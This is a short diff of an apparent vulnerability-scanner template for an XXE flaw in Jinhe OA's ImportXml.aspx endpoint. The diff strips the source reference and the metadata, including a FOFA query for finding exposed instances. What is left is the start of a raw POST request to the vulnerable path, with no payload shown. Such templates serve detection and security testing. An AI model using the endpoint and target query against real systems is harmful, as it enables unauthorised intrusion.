@@ -3,12 +3,8 @@ info:
   name: 金和OA ImportXml.aspx 存在XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tfpsiuf8oyasg5vt'
+  description: ''
   tags: xxe,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tfpsiuf8oyasg5vt
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'POST /c6/Jhsoft.Web.Appraise/ImportXml.aspx/ HTTP/1.1
